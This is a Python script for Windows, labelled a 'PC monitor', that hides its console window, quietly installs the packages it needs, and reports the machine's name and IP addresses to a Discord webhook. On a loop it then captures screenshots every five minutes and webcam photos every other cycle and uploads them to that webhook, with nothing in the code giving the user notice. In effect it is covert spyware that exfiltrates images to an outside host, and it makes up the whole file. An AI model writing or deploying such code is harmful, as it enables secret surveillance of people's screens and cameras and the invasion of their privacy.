import os
import sys
import socket
import datetime
import subprocess
import platform
import shutil
import threading
import time
import ctypes
import io
import json
import requests
import winreg

# ==================== CONFIGURATION ====================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
PC_NAME = socket.gethostname()
CHECK_INTERVAL = 300  # 5 minutes in seconds

# ==================== HIDE CONSOLE ====================
def hide_console():
    """Hide the console window"""
    try:
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        user32 = ctypes.WinDLL('user32', use_last_error=True)
        
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)
        kernel32.FreeConsole()
    except:
        pass

# ==================== PC INFO FUNCTIONS ====================
def get_pc_info():
    """Get PC information"""
    pc_name = socket.gethostname()
    
    # Get local IP address
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
    except:
        ip_address = "Unable to get IP"
    
    # Get public IP
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        public_ip = "Unable to get public IP"
    
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    os_info = f"{platform.system()} {platform.release()}"
    
    return {
        "pc_name": pc_name,
        "ip_address": ip_address,
        "public_ip": public_ip,
        "time": current_time,
        "os_info": os_info
    }

# ==================== SCREENSHOT FUNCTIONS ====================
def take_screenshot():
    """Take a screenshot of the primary monitor"""
    try:
        from PIL import ImageGrab
        
        screenshot = ImageGrab.grab()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        return img_bytes.getvalue()
    except Exception as e:
        log_error(f"Screenshot error: {e}")
        return None

def send_screenshot_to_discord():
    """Take a screenshot and send it to Discord"""
    try:
        screenshot_bytes = take_screenshot()
        if not screenshot_bytes:
            return
        
        pc_name = socket.gethostname()
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{pc_name}_{timestamp}.png"
        
        files = {'file': (filename, screenshot_bytes, 'image/png')}
        
        caption = f"📸 Screenshot from **{pc_name}** at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        data = {'content': caption}
        
        response = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=30)
        
        if response.status_code in [200, 204]:
            log_message(f"Screenshot sent: {filename}")
    except Exception as e:
        log_error(f"Error sending screenshot: {e}")

# ==================== WEBCAM FUNCTIONS ====================
def take_webcam_photo():
    """Take a photo from the webcam if available"""
    try:
        import cv2
        
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        
        time.sleep(0.5)
        ret, frame = cap.read()
        cap.release()
        
        if not ret or frame is None:
            return None
        
        _, buffer = cv2.imencode('.jpg', frame)
        return buffer.tobytes()
    except:
        return None

def send_webcam_to_discord():
    """Take a webcam photo and send it to Discord"""
    try:
        webcam_bytes = take_webcam_photo()
        if not webcam_bytes:
            return
        
        pc_name = socket.gethostname()
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"webcam_{pc_name}_{timestamp}.jpg"
        
        files = {'file': (filename, webcam_bytes, 'image/jpeg')}
        
        caption = f"📷 Webcam photo from **{pc_name}** at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        data = {'content': caption}
        
        response = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=30)
        
        if response.status_code in [200, 204]:
            log_message(f"Webcam photo sent: {filename}")
    except Exception as e:
        log_error(f"Error sending webcam photo: {e}")

# ==================== HEARTBEAT FUNCTION ====================
def send_heartbeat():
    """Send periodic 'I'm alive' message"""
    try:
        pc_info = get_pc_info()
        
        data = {
            "embeds": [{
                "title": "✅ PC is ONLINE",
                "description": f"**{pc_info['pc_name']}** is running",
                "color": 3066993,  # Green
                "fields": [
                    {"name": "💻 PC Name", "value": pc_info['pc_name'], "inline": True},
                    {"name": "🌐 Local IP", "value": pc_info['ip_address'], "inline": True},
                    {"name": "🌍 Public IP", "value": pc_info['public_ip'], "inline": True},
                    {"name": "⏰ Time", "value": pc_info['time'], "inline": True}
                ],
                "timestamp": datetime.datetime.now().isoformat()
            }]
        }
        
        requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
        log_message("Heartbeat sent")
    except Exception as e:
        log_error(f"Heartbeat failed: {e}")

# ==================== LOGGING ====================
def log_message(message):
    """Log info messages to file"""
    try:
        log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'pc_monitor.log')
        with open(log_path, 'a') as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] INFO: {message}\n")
    except:
        pass

def log_error(error_message):
    """Log errors to a file"""
    try:
        log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'pc_monitor.log')
        with open(log_path, 'a') as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] ERROR: {error_message}\n")
    except:
        pass

# ==================== MAIN LOOP ====================
def main_loop():
    """Main loop that handles periodic tasks"""
    screenshot_counter = 0
    
    while True:
        try:
            # Send heartbeat every hour (12 * 5 minutes = 1 hour)
            if screenshot_counter % 12 == 0:
                send_heartbeat()
            
            # Take screenshot every interval
            send_screenshot_to_discord()
            
            # Take webcam photo every other time
            if screenshot_counter % 2 == 0:
                send_webcam_to_discord()
            
            screenshot_counter += 1
            
            # Sleep for interval
            for _ in range(CHECK_INTERVAL):
                time.sleep(1)
                
        except Exception as e:
            log_error(f"Main loop error: {e}")
            time.sleep(60)

# ==================== INSTALL DEPENDENCIES ====================
def install_dependencies():
    """Install required Python packages"""
    dependencies = ['requests', 'pillow']
    
    # Try to install opencv-python (optional for webcam)
    try:
        import cv2
    except:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "opencv-python", "--quiet"],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    
    for dep in dependencies:
        try:
            __import__(dep)
        except:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", dep, "--quiet"],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(1)
            except:
                log_error(f"Failed to install {dep}")

# ==================== ENTRY POINT ====================
def main():
    """Main function"""
    # Hide console
    hide_console()
    
    # Install dependencies
    install_dependencies()
    
    # Send startup notification
    pc_info = get_pc_info()
    startup_msg = {
        "content": f"🚀 **{pc_info['pc_name']}** started monitoring!\nIP: {pc_info['ip_address']}\nPublic IP: {pc_info['public_ip']}"
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=startup_msg, timeout=5)
    except:
        pass
    
    # Run main loop
    main_loop()

if __name__ == "__main__":
    main()